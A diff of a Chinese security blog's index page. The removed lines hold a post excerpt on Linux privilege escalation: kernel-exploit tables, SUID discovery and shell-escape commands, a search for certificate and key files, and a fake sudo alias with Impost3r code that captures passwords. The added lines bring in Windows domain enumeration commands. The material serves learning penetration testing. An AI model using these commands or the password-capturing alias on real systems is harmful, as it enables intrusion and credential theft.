-<th>2016/11/02</th>
-<th>Linux Kernel (Ubuntu /Fedora / RedHat) -‘Overlayfs’ Local PrivilegeEscalation (Metasploit)</th>
-<th>Metasploit</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2016/10/21</td>
-<td>Linux Kernel 2.6.22 &lt; 3.9(x86/x64) - ‘Dirty COW/proc/self/mem’ RaceCondition PrivilegeEscalation (SUID Method)</td>
-<td>Robin Verton</td>
-</tr>
-<tr>
-<td>2016/10/19</td>
-<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’ /proc/self/memRace Condition (WriteAccess Method)</td>
-<td>Phil Oester</td>
-</tr>
-<tr>
-<td>2016/10/11</td>
-<td>Linux Kernel 3.13.1 -‘Recvmmsg’ Local PrivilegeEscalation (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2016/06/21</td>
-<td>Linux Kernel - ‘ecryptfs’’/proc/$pid/environ’ LocalPrivilege Escalation</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2016/05/04</td>
-<td>Linux Kernel 4.4.x (Ubuntu16.04) - ‘double-fdput()’bpf(BPF_PROG_LOAD)Privilege Escalation</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2016/05/04</td>
-<td>Linux Kernel (Ubuntu14.04.3) -‘perf_event_open()’ Can Racewith execve() (Access/etc/shadow)</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2014/05/28</td>
-<td>Linux Kernel 3.3.5 -‘/drivers/media/media-device.c’ Local InformationDisclosure</td>
-<td>Salva Peiro</td>
-</tr>
-<tr>
-<td>2016/01/05</td>
-<td>Linux Kernel 4.3.3 (Ubuntu14.04/15.10) - ‘overlayfs’Local Privilege Escalation (1)</td>
-<td>rebel</td>
-</tr>
-<tr>
-<td>2013/06/07</td>
-<td>Linux Kernel 3.3.5 - ‘b43’Wireless Driver PrivilegeEscalation</td>
-<td>Kees Cook</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2015/10/15</th>
-<th>Linux Kernel 3.17 - ‘Pythonctypes and memfd_create’noexec File Security Bypass</th>
-<th>soyer</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2013/03/13</td>
-<td>Linux Kernel 3.0 &lt; 3.3.5 -‘CLONE_NEWUSER|CLONE_FS’ Local Privilege Escalation</td>
-<td>Sebastian Krahmer</td>
-</tr>
-<tr>
-<td>2012/10/09</td>
-<td>Linux Kernel 3.2.x -‘uname()’ System Call LocalInformation Disclosure</td>
-<td>Brad Spengler</td>
-</tr>
-<tr>
-<td>2012/07/26</td>
-<td>Linux Kernel 2.6.x -‘rds_recvmsg()’ LocalInformation Disclosure</td>
-<td>Jay Fenlason</td>
-</tr>
-<tr>
-<td>2015/06/16</td>
-<td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation (Access/etc/shadow)</td>
-<td></td>
-</tr>
-<tr>
-<td>2015/06/16</td>
-<td>Linux Kernel 3.13.0 &lt; 3.19(Ubuntu12.04/14.04/14.10/15.04) -‘overlayfs’ Local PrivilegeEscalation</td>
-<td>rebel</td>
-</tr>
-<tr>
-<td>2011/11/07</td>
-<td>Linux Kernel 3.0.4 -‘/proc/interrupts’ PasswordLength Local InformationDisclosure</td>
-<td>Vasiliy Kulikov</td>
-</tr>
-<tr>
-<td>2012/01/12</td>
-<td>Linux Kernel 2.6.39 &lt; 3.2.2(x86/x64) - ‘Mempodipper’Local Privilege Escalation (2)</td>
-<td>zx2c4</td>
-</tr>
-<tr>
-<td>2014/10/20</td>
-<td>Linux PolicyKit - RaceCondition PrivilegeEscalation (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2010/11/09</td>
-<td>Linux Kernel 2.6.x -‘net/core/filter.c’ LocalInformation Disclosure</td>
-<td>Dan Rosenberg</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2010/05/18</th>
-<th>Linux Kernel 2.6.x - BtrfsCloned File Security Bypass</th>
-<th>Dan Rosenberg</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2014/06/21</td>
-<td>Linux Kernel 3.13 - SGIDPrivilege Escalation</td>
-<td>Vitaly Nikolenko</td>
-</tr>
-<tr>
-<td>2009/12/16</td>
-<td>Linux Kernel &lt; 2.6.28 -‘fasync_helper()’ LocalPrivilege Escalation</td>
-<td>Tavis Ormandy</td>
-</tr>
-<tr>
-<td>2009/11/09</td>
-<td>Linux Kernel 2.6.x - Ext4’move extents’ ioctl PrivilegeEscalation</td>
-<td>Akira Fujita</td>
-</tr>
-<tr>
-<td>2013/02/24</td>
-<td>Linux Kernel 3.3 &lt; 3.8(Ubuntu / Fedora 18) -‘sock_diag_handlers()’ LocalPrivilege Escalation (3)</td>
-<td>SynQ</td>
-</tr>
-<tr>
-<td>2009/11/03</td>
-<td>Linux Kernel 2.6.x - ‘pipe.c’Local Privilege Escalation (2)</td>
-<td>teach &amp; xipe</td>
-</tr>
-<tr>
-<td>2009/11/03</td>
-<td>Linux Kernel 2.6.0 &lt; 2.6.31 -‘pipe.c’ Local PrivilegeEscalation (1)</td>
-<td>teach &amp; xipe</td>
-</tr>
-<tr>
-<td>2009/03/02</td>
-<td>Linux Kernel 2.6.x -‘seccomp’ System CallSecurity Bypass</td>
-<td>Chris Evans</td>
-</tr>
-<tr>
-<td>2009/02/20</td>
-<td>Linux Kernel 2.6.x - ‘sock.c’SO_BSDCOMPAT OptionInformation Disclosure</td>
-<td>Clément Lecigne</td>
-</tr>
-<tr>
-<td>2014/02/02</td>
-<td>Linux Kernel 3.4 &lt; 3.13.2(Ubuntu 13.10) -‘CONFIG_X86_X32’ ArbitraryWrite (2)</td>
-<td>saelo</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2007/9/21</th>
-<th>Linux Kernel 2.6.x - ALSAsnd-page-alloc Local ProcFile Information Disclosure</th>
-<th>Karimo_DM</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2007/9/21</td>
-<td>Linux Kernel 2.6.x - PtracePrivilege Escalation</td>
-<td>Wojciech Purczynski</td>
-</tr>
-<tr>
-<td>2007/03/05</td>
-<td>Linux Kernel 2.6.17 -‘Sys_Tee’ Local PrivilegeEscalation</td>
-<td>Michael Kerrisk</td>
-</tr>
-<tr>
-<td>2006/07/27</td>
-<td>Linux-HA Heartbeat1.2.3/2.0.x - InsecureDefault Permissions onShared Memory</td>
-<td>anonymous</td>
-</tr>
-<tr>
-<td>2006/04/28</td>
-<td>Linux Kernel 2.6.x - CIFSCHRoot Security RestrictionBypass</td>
-<td>Marcel Holtmann</td>
-</tr>
-<tr>
-<td>2006/04/28</td>
-<td>Linux Kernel 2.6.x - SMBFSCHRoot Security RestrictionBypass</td>
-<td>Marcel Holtmann</td>
-</tr>
-<tr>
-<td>2006/03/23</td>
-<td>Linux Kernel2.4.x/2.5.x/2.6.x -‘Sockaddr_In.Sin_Zero’Kernel Memory Disclosure</td>
-<td>Pavel Kankovsky</td>
-</tr>
-<tr>
-<td>2005/10/17</td>
-<td>Linux Kernel 2.6 - ConsoleKeymap Local CommandInjection</td>
-<td>Rudolf Polzer</td>
-</tr>
-<tr>
-<td>2005/05/26</td>
-<td>Linux Kernel 2.6.x -Cryptoloop InformationDisclosure</td>
-<td>Markku-JuhaniO. Saarinen</td>
-</tr>
-<tr>
-<td>2005/10/19</td>
-<td>Linux Kernel 2.4.30/2.6.11.5- BlueTooth’bluez_sock_create’ LocalPrivilege Escalation</td>
-<td>backdoored.net</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2005/04/08</th>
-<th>Linux Kernel 2.4.x/2.6.x -BlueTooth Signed BufferIndex Privilege Escalation (1)</th>
-<th>qobaiashi</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2005/03/09</td>
-<td>Linux Kernel 2.6.x -‘SYS_EPoll_Wait’ LocalInteger Overflow / LocalPrivilege Escalation (1)</td>
-<td>sd</td>
-</tr>
-<tr>
-<td>2004/04/23</td>
-<td>Linux Kernel 2.5.x/2.6.x -CPUFreq Proc HandlerInteger Handling MemoryRead</td>
-<td>Brad Spengler</td>
-</tr>
-<tr>
-<td>2004/02/09</td>
-<td>Samba 2.2.8 (Linux Kernel2.6 / Debian / Mandrake) -Share Privilege Escalation</td>
-<td>Martin Fiala</td>
-</tr>
-<tr>
-<td>2004/02/06</td>
-<td>Linux VServer Project 1.2x -Chroot Breakout</td>
-<td>Markus Mueller</td>
-</tr>
-<tr>
-<td>2003/10/06</td>
-<td>SuSE Linux Professional 8.2- SuSEWM ConfigurationFile Insecure Temporary File</td>
-<td>Nash Leon</td>
-</tr>
-<tr>
-<td>2003/09/09</td>
-<td>RealOne Player for Linux 2.2Alpha - InsecureConfiguration FilePermission PrivilegeEscalation</td>
-<td>Jon Hart</td>
-</tr>
-<tr>
-<td>2012/12/02</td>
-<td>MySQL (Linux) - DatabasePrivilege Escalation</td>
-<td>kingcope</td>
-</tr>
-<tr>
-<td>2003/06/26</td>
-<td>Linux Kernel 2.4 - SUID’execve()’ System Call RaceCondition Executable FileRead</td>
-<td>IhaQueR</td>
-</tr>
-<tr>
-<td>2003/06/20</td>
-<td>Linux Kernel 2.2.x/2.4.x -‘/proc’ FilesystemInformation Disclosure</td>
-<td>IhaQueR</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2003/06/16</th>
-<th>Linux PAM 0.77 -Pam_Wheel Module’getlogin() Username’Spoofing Privilege Escalation</th>
-<th>Karol Wiesek</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2003/02/18</td>
-<td>Linux-ATM LES 2.4 -Command Line ArgumentBuffer Overflow</td>
-<td>Angelo Rosiello</td>
-</tr>
-<tr>
-<td>2003/04/04</td>
-<td>Linux Kernel 2.2.x/2.4.x -I/O System Call FileExistence</td>
-<td>Andrew Griffiths</td>
-</tr>
-<tr>
-<td>2003/04/10</td>
-<td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (2)</td>
-<td>Wojciech Purczynski</td>
-</tr>
-<tr>
-<td>2003/03/17</td>
-<td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (1)</td>
-<td><a href="mailto:anszom@v-lo.krakow.pl" target="_blank" rel="noopener">anszom@v-lo.krakow.pl</a></td>
-</tr>
-<tr>
-<td>2012/10/10</td>
-<td>Linux Kernel UDEV &lt; 1.4.1 -‘Netlink’ Local PrivilegeEscalation (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2002/08/28</td>
-<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (3)</td>
-<td>syscalls</td>
-</tr>
-<tr>
-<td>2002/08/28</td>
-<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (2)</td>
-<td>David Endler</td>
-</tr>
-<tr>
-<td>2002/08/28</td>
-<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (1)</td>
-<td>RaiSe</td>
-</tr>
-<tr>
-<td>2002/08/10</td>
-<td>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (2)</td>
-<td>TESO Security</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2002/08/10</th>
-<th>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (1)</th>
-<th>Gobbles Security</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2002/05/17</td>
-<td>Grsecurity Kernel Patch 1.9.4(Linux Kernel) - MemoryProtection</td>
-<td>Guillaume PELAT</td>
-</tr>
-<tr>
-<td>2002/03/26</td>
-<td>Linux Kernel 2.2.x/2.3/2.4.x- ‘d_path()’ Path Truncation</td>
-<td>cliph</td>
-</tr>
-<tr>
-<td>2002/02/25</td>
-<td>Century Software Term ForLinux 6.27.869 - CommandLine Buffer Overflow</td>
-<td>Haiku Hacker</td>
-</tr>
-<tr>
-<td>2000/08/25</td>
-<td>User-Mode Linux (LinuxKernel 2.4.17-8) - MemoryAccess Privilege Escalation</td>
-<td>Andrew Griffiths</td>
-</tr>
-<tr>
-<td>2001/11/21</td>
-<td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Local Buffer Overflow</td>
-<td>IhaQueR@IRCnet</td>
-</tr>
-<tr>
-<td>2001/11/21</td>
-<td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Shell Definition FormatString</td>
-<td>IhaQueR@IRCnet</td>
-</tr>
-<tr>
-<td>2001/10/18</td>
-<td>Linux Kernel 2.2/2.4 -Ptrace/Setuid Exec PrivilegeEscalation</td>
-<td>Rafal Wojtczuk</td>
-</tr>
-<tr>
-<td>2001/06/27</td>
-<td>Linux Kernel 2.2/2.4 -procfs Stream redirection toProcess Memory PrivilegeEscalation</td>
-<td></td>
-</tr>
-<tr>
-<td>2001/06/12</td>
-<td>Linux Man Page6.1/6.2/7.0/7.1- SourceBuffer Overflow</td>
-<td>zen-parse</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2001/05/13</th>
-<th>Immunix OS 6.2/7.0 /RedHat 5.2/6.2/7.0 / SuSELinux 6.x/7.0/7.1 - ‘Man -S’Heap Overflow</th>
-<th>zenith parsec</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2001/03/27</td>
-<td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (2)</td>
-<td>Wojciech Purczynski</td>
-</tr>
-<tr>
-<td>2001/03/27</td>
-<td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (1)</td>
-<td>Wojciech Purczynski</td>
-</tr>
-<tr>
-<td>2001/02/09</td>
-<td>Linux Kernel 2.2.x - ‘sysctl()’Memory Reading</td>
-<td>Chris Evans</td>
-</tr>
-<tr>
-<td>2000/11/30</td>
-<td>Linux Kernel 2.2.x - Non-Readable File Ptrace LocalInformation Leak</td>
-<td>Lamagra Argamal</td>
-</tr>
-<tr>
-<td>2000/11/12</td>
-<td>Linux modutils 2.3.9 -‘modprobe’ ArbitraryCommand Execution</td>
-<td>Michal Zalewski</td>
-</tr>
-<tr>
-<td>2000/06/07</td>
-<td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail 8.10.1 CapabilitiesPrivilege Escalation (2)</td>
-<td>Wojciech Purczynski</td>
-</tr>
-<tr>
-<td>2000/06/07</td>
-<td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail CapabilitiesPrivilege Escalation(1)</td>
-<td>Florian Heinz</td>
-</tr>
-<tr>
-<td>2000/05/29</td>
-<td>Mandriva Linux Mandrake 7.0- Local Buffer Overflow</td>
-<td>noir</td>
-</tr>
-<tr>
-<td>2000/05/22</td>
-<td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (3)</td>
-<td>WaR</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2000/05/22</th>
-<th>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (2)</th>
-<th>Scrippie</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2000/05/22</td>
-<td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (1)</td>
-<td>Paulo Ribeiro</td>
-</tr>
-<tr>
-<td>2012/07/19</td>
-<td>Linux Kernel 2.4.4 &lt; 2.4.37.4/ 2.6.0 &lt; 2.6.30.4 -‘Sendpage’ Local PrivilegeEscalation (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2000/05/03</td>
-<td>RedHat Linux 6.0/6.1/6.2 -‘pam_console’ MonitorActivity After Logout</td>
-<td>Michal Zalewski</td>
-</tr>
-<tr>
-<td>2000/04/29</td>
-<td>SuSE Linux 6.3/6.4 Gnomelib- Local Buffer Overflow</td>
-<td>bladi</td>
-</tr>
-<tr>
-<td>2000/04/21</td>
-<td>SuSE Linux 6.x - ArbitraryFile Deletion</td>
-<td>Peter_M</td>
-</tr>
-<tr>
-<td>2000/04/10</td>
-<td>Bray Systems Linux Trustees1.5 - Long Pathname</td>
-<td>Andrey E. Lerman</td>
-</tr>
-<tr>
-<td>2000/03/16</td>
-<td>Halloween Linux 4.0 / SuSELinux 6.0/6.1/6.2/6.3 -‘kreatecd’ Local PrivilegeEscalation</td>
-<td>Sebastian</td>
-</tr>
-<tr>
-<td>2000/03/13</td>
-<td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (2)</td>
-<td>S.Krahmer &amp; Stealth</td>
-</tr>
-<tr>
-<td>2000/03/13</td>
-<td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (1)</td>
-<td>funkysh</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2000/03/11</th>
-<th>AT Computing atsar_linux 1.4- File Manipulation</th>
-<th>S. Krahmer</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2000/03/05</td>
-<td>Oracle8i Standard Edition8.1.5 for Linux Installer -Local Privilege Escalation</td>
-<td>Keyser Soze</td>
-</tr>
-<tr>
-<td>2000/03/02</td>
-<td>Corel Linux OS 1.0 - DosemuDistribution Configuration</td>
-<td>suid</td>
-</tr>
-<tr>
-<td>2000/02/26</td>
-<td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (2)</td>
-<td>Babcia Padlina</td>
-</tr>
-<tr>
-<td>2000/02/26</td>
-<td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (1)</td>
-<td>Babcia Padlina</td>
-</tr>
-<tr>
-<td>2000/02/24</td>
-<td>Corel Linux OS 1.0 -‘setxconf’ Local PrivilegeEscalation</td>
-<td>suid</td>
-</tr>
-<tr>
-<td>2000/02/24</td>
-<td>Corel Linux OS 1.0 -buildxconfig</td>
-<td>suid</td>
-</tr>
-<tr>
-<td>2000/02/23</td>
-<td>RedHat Linux 6.0 - SingleUser Mode Authentication</td>
-<td>Darren Reed</td>
-</tr>
-<tr>
-<td>2000/01/12</td>
-<td>Corel Linux OS 1.0 - get_itPATH</td>
-<td>Cesar Tascon Alvarez</td>
-</tr>
-<tr>
-<td>2000/03/15</td>
-<td>Mandrake 6.x / RedHat 6.x /Turbolinux 3.5 b2/4.x/6.0.2userhelper/PAM - Path (2)</td>
-<td>Elias Levy</td>
-</tr>
-</tbody></table>
-<p>⽐较常⽤的漏洞：</p>
-<p>CVE-2016-5195: 脏⽜漏洞</p>
-<p>CVE-2019-14287: sudo溢出漏洞</p>
-<p>可以通过⾃动化脚本来匹配相关的内核漏洞：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebootuser/LinEnum </span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-suid提权"><a href="#0x03-suid提权" class="headerlink" title="0x03 suid提权"></a><strong>0x03 suid提权</strong></h3><p>suid允许⽤户在执⾏⽤户的许可下执⾏⽂件，创建和打开⽹络套接字⼀般需要root权限，但是为了⽅便使 ⽤，如Ping命令，通过设置Ping程序的suid，就可以允许低权限⽤户执⾏Ping程序时是以root权限执⾏。因此，如果⼀个程序中设置了suid，我们可以该程序⽣成的shell来提升权限。</p>
-<p><strong>查找suid和guid⽂件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><strong>其它可⽤的命令</strong></p>
-<p><strong>查找密钥或者证书:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f &apos;(&apos; -name .cert -or -name .crt -or -name .pem -or name .ca -or -name .p12 -or -name .cer -name *.der &apos;)&apos; &apos;(&apos; &apos;(&apos; -us er support -perm -u=r &apos;)&apos; -or &apos;(&apos; -group support -perm -g=r &apos;)&apos; -o r &apos;(&apos; -perm -o=r &apos;)&apos; &apos;)&apos; 2&gt; /dev/null-or -name .cer -name .der &apos;)&apos; 2&gt; /dev/nu</span><br></pre></td></tr></table></figure>
-
-<p><strong>查找root拥有的suid⽂件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><strong>例⼦</strong></p>
-<p><strong>vi / vim</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-
-<p><strong>less</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><strong>nmap</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -interactive</span><br><span class="line">! sh</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04-伪造sudo"><a href="#0x04-伪造sudo" class="headerlink" title="0x04 伪造sudo"></a><strong>0x04 伪造sudo</strong></h3><p>Linux下命令执⾏顺序可以由⽤户决定，如改变.bashrc中的环境变量信息，也可以给某命令增加⼀个别名 等。可以伪造⼀个sudo命令，让⽤户每次输⼊的⼝令都存储下来，达到提权的⽬的。这⾥推荐Impost3r项⽬</p>
-<p><strong>创建sudo别名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alias sudo=&apos;impost3r() &#123;</span><br><span class="line">if [ -f &quot;/tmp/.impost3r&quot; ]; then</span><br><span class="line">/tmp/.impost3r &quot;$@&quot; &amp;&amp; unalias sudo</span><br><span class="line">else</span><br><span class="line">unalias sudo;sudo &quot;$@&quot;</span><br><span class="line">fi</span><br><span class="line">&#125;; impost3r&apos;</span><br></pre></td></tr></table></figure>
-
-<p><strong>impost3r核⼼代码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int pid = fork();</span><br><span class="line">if (pid == 0)</span><br><span class="line">&#123;</span><br><span class="line">successFlag = 0;</span><br><span class="line">save_passwd(usrInfo-&gt;pw_name,originPasswd,allPasswd,1);</span><br><span class="line">return allPasswd;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">wait(NULL); // 防⽌⽤户执⾏的是⽆限循环服务，从⽽产⽣僵⼫进程</span><br><span class="line">execv(&quot;/usr/bin/sudo&quot;,params);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将⽤户输⼊的⼝令信息先通过 save_passwd 存储下来，然后再调⽤真实的sudo命令。</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x05-其它提权⼿法"><a href="#0x05-其它提权⼿法" class="headerlink" title="0x05 其它提权⼿法"></a><strong>0x05 其它提权⼿法</strong></h3><p>1.LXD提权</p>
-<p>2.cronjob计划任务提权</p>
-<p>3.NFS提权</p>
-<p>4.⼝令爆破提权</p>
-<h1 id="内网横向移动（拿域控）"><a href="#内网横向移动（拿域控）" class="headerlink" title="内网横向移动（拿域控）"></a>内网横向移动（拿域控）</h1><ol>
-<li>使用当前权限添加内网路由，进行弱口令扫描</li>
-<li>使用powershell对内网进行扫描（目标机器 &gt; win7）</li>
-<li>架设Socket4a，然后Socket会自动进行内网扫描</li>
-<li>利用当前权限进行内网IPC$渗透</li>
-</ol>
-
-          
+          <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user /domain		<span class="comment">#查看域用户</span></span><br><span class="line">net view /domain		<span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX	<span class="comment">#查看域内主机</span></span><br><span class="line">net group /domain		<span class="comment">#查看域里面的组</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain	<span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain		<span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain	<span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">"enterprise admins"</span> /domain	<span class="comment">#查看企业管理组</span></span><br><span class="line">nettime /domain			<span class="comment">#查看时间服务器</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/03/08/内网学习记录.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2485,156 +1875,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/02/06/linux反弹shell的几种常见手段.html/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="狗蛋菌">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Goudan's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/06/linux反弹shell的几种常见手段.html/" itemprop="url">linux反弹shell的几种常见手段</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-06T21:04:23+08:00">
-                2021-02-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  0 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2685,7 +1925,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2698,7 +1938,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
